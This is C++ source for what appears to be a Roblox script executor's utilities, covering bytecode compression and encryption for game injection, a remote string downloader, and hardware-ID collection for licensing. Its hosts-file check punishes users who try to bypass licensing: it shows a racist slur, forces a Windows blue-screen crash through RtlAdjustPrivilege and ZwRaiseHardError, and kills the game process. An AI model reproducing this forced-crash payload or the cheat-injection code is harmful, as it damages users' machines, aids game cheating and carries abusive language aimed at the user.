#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <map>

#include "XorStr.hpp"

#include <ShlObj.h>
#include <Wininet.h>
#include <TlHelp32.h>
#include <queue>

#pragma comment(lib, "wininet.lib")

#include "Compressor/include/xxhash.h"
#include "Compressor/include/zstd.h"


namespace Utils
{
	static std::string init_script = "";
	static std::string lz4_library = "";

	static auto compress_bytecode(std::string source) -> std::string
	{
		const auto data_size = source.size();
		const auto max_size = ZSTD_compressBound(data_size);
		auto buffer = std::vector<char>(max_size + 8);

		strcpy_s(&buffer[0], buffer.capacity(), xorstr_("RSB1"));
		memcpy_s(&buffer[4], buffer.capacity(), &data_size, sizeof(data_size));

		const auto compressed_size = ZSTD_compress(&buffer[8], max_size, source.data(), data_size, ZSTD_maxCLevel());
		if (ZSTD_isError(compressed_size))
			throw std::runtime_error(xorstr_("Failed to compress the bytecode."));

		const auto size = compressed_size + 8;
		const auto key = XXH32(buffer.data(), size, 42u);
		const auto bytes = reinterpret_cast<const uint8_t*>(&key);

		for (auto i = 0u; i < size; ++i)
			buffer[i] ^= bytes[i % 4] + i * 41u;

		return std::string(buffer.data(), size);
	}


	static std::string decompress_bytecode(std::string data)
	{
		const char bytecode_magic[] = "RSB1";
		uint8_t hash_bytes[4];
		std::memcpy(hash_bytes, &data[0], 4);

		for (auto i = 0u; i < 4; ++i)
		{
			hash_bytes[i] ^= bytecode_magic[i];
			hash_bytes[i] -= i * 41;
		}

		for (size_t i = 0; i < data.length(); ++i)
			data[i] ^= hash_bytes[i % 4] + i * 41;

		XXH32(data.data(), data.length(), 42);

		uint32_t data_size;
		std::memcpy(&data_size, &data[4], 4);

		std::vector<uint8_t> zaazaa(data_size);
		ZSTD_decompress(&zaazaa[0], data_size, &data[8], data.size() - 8);

		return std::string((char*)(&zaazaa[0]), data_size);
	}

	namespace Workspace
	{
		auto initialize() -> void
		{
			auto path = std::filesystem::path(getenv("localappdata")) / "calibri-workspace";
			if (!std::filesystem::exists(path))
				std::filesystem::create_directory(path);
		}


		auto get() -> std::filesystem::path
		{
			return std::filesystem::path(getenv("localappdata")) / "calibri-workspace";
		}
	}

	namespace Assets
	{
		auto initialize() -> void
		{
			auto path = std::filesystem::path(getenv("localappdata")) / "calibri-assets";
			if (!std::filesystem::exists(path))
				std::filesystem::create_directory(path);
		}


		auto get() -> std::filesystem::path
		{
			return std::filesystem::path(getenv("localappdata")) / "calibri-assets";
		}
	}

	std::string random_str(int length) {
		static std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		std::string result;
		result.resize(length);

		srand(time(NULL));
		for (int i = 0; i < length; i++)
			result[i] = charset[rand() % charset.length()];

		return result;
	}

	static std::string replace_all(std::string subject, const std::string& search, const std::string& replace)
	{
		size_t pos = 0;
		while ((pos = subject.find(search, pos)) != std::string::npos)
		{
			subject.replace(pos, search.length(), replace);
			pos += replace.length();
		}
		return subject;
	}

	static auto replace(std::string& str, const std::string& from, const std::string& to) -> bool
	{
		size_t start_pos = str.find(from);
		if (start_pos == std::string::npos)
			return false;
		str.replace(start_pos, from.length(), to);
		return true;
	}


	static std::string download_string(std::string URL)
	{
		HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		HINTERNET urlFile;
		std::string rtn;
		if (interwebs)
		{
			urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
			if (urlFile)
			{
				char buffer[2000];
				DWORD bytesRead;
				do
				{
					InternetReadFile(urlFile, buffer, 2000, &bytesRead);
					rtn.append(buffer, bytesRead);
					memset(buffer, 0, 2000);
				} while (bytesRead);
				InternetCloseHandle(interwebs);
				InternetCloseHandle(urlFile);
				std::string p = replace_all(rtn, "|n", "\r\n");
				return p;
			}
		}
		InternetCloseHandle(interwebs);
		std::string p = replace_all(rtn, "|n", "\r\n");
		return p;
	}

	void terminate_process(const std::string& process_name) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot == INVALID_HANDLE_VALUE) {
			std::cerr << xorstr_("Failed to create snapshot") << std::endl;
			return;
		}

		PROCESSENTRY32 process_entry;
		process_entry.dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(snapshot, &process_entry)) {
			std::cerr << xorstr_("Failed to retrieve process information") << std::endl;
			CloseHandle(snapshot);
			return;
		}

		do {
			if (process_name == process_entry.szExeFile) {
				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, process_entry.th32ProcessID);
				if (process == NULL) {
					CloseHandle(snapshot);
					return;
				}

				TerminateProcess(process, 0);
				CloseHandle(process);
				break;
			}
		} while (Process32Next(snapshot, &process_entry));

		CloseHandle(snapshot);
	}

	typedef NTSTATUS(NTAPI* tRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	typedef NTSTATUS(NTAPI* tZwRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

	void triggerBSOD() {
		BOOLEAN enabled;
		ULONG response;

		HMODULE ntdll = GetModuleHandleA(xorstr_("ntdll.dll"));
		tRtlAdjustPrivilege RtlAdjustPrivilege = (tRtlAdjustPrivilege)GetProcAddress(ntdll, xorstr_("RtlAdjustPrivilege"));
		tZwRaiseHardError ZwRaiseHardError = (tZwRaiseHardError)GetProcAddress(ntdll, xorstr_("ZwRaiseHardError"));

		if (RtlAdjustPrivilege && ZwRaiseHardError) {
			RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);

			ZwRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);
		}
	}

	void checkHostsFile(const std::string& filePath) {
		std::ifstream hostsFile(filePath);
		if (!hostsFile.is_open()) {
			MessageBoxA(NULL, xorstr_("Failed to read hosts file!"), xorstr_("Error:"), 0x00000010L);
			return;
		}

		std::string line;
		while (std::getline(hostsFile, line)) {
			if (line.find(xorstr_("35.173.69.207")) != std::string::npos ||
				line.find(xorstr_("thephantomx.pythonanywhere.com")) != std::string::npos) {
				MessageBoxA(NULL, xorstr_("You tried to crack auth! Kys black monkey! Bye!"), xorstr_("Error:"), 0x00000010L);
				triggerBSOD();
				terminate_process("RobloxPlayerBeta.exe");
				exit(0);
				break;
			}
		}

		hostsFile.close();
	}
}


namespace KeyWorker
{
	std::string GetHWID() {
		HKEY hKey;
		const char* location = xorstr_("SOFTWARE\\Microsoft\\Cryptography");
		const char* name = xorstr_("MachineGuid");
		char value[256];
		DWORD value_length = sizeof(value);

		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, location, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
			throw std::runtime_error(xorstr_("Key Not Found: ") + std::string(location));
		}

		if (RegQueryValueExA(hKey, name, NULL, NULL, (LPBYTE)&value, &value_length) != ERROR_SUCCESS) {
			RegCloseKey(hKey);
			throw std::runtime_error(xorstr_("Index Not Found: ") + std::string(name));
		}

		RegCloseKey(hKey);

		return std::string(value, value_length - 1);
	}


	auto GetVideocardName() -> std::string {
		for (int i = 0; ; i++)
		{
			DISPLAY_DEVICE dd = { sizeof(dd), 0 };
			BOOL f = EnumDisplayDevices(NULL, i, &dd, EDD_GET_DEVICE_INTERFACE_NAME);
			if (!f)
				break;

			return dd.DeviceString;
		}
	}


	auto GetPCName() -> std::string
	{
		char buffer[MAX_COMPUTERNAME_LENGTH + 1] = "";
		unsigned long size = MAX_COMPUTERNAME_LENGTH + 1;
		::GetComputerName(buffer, &size);

		return std::string(buffer);
	}
}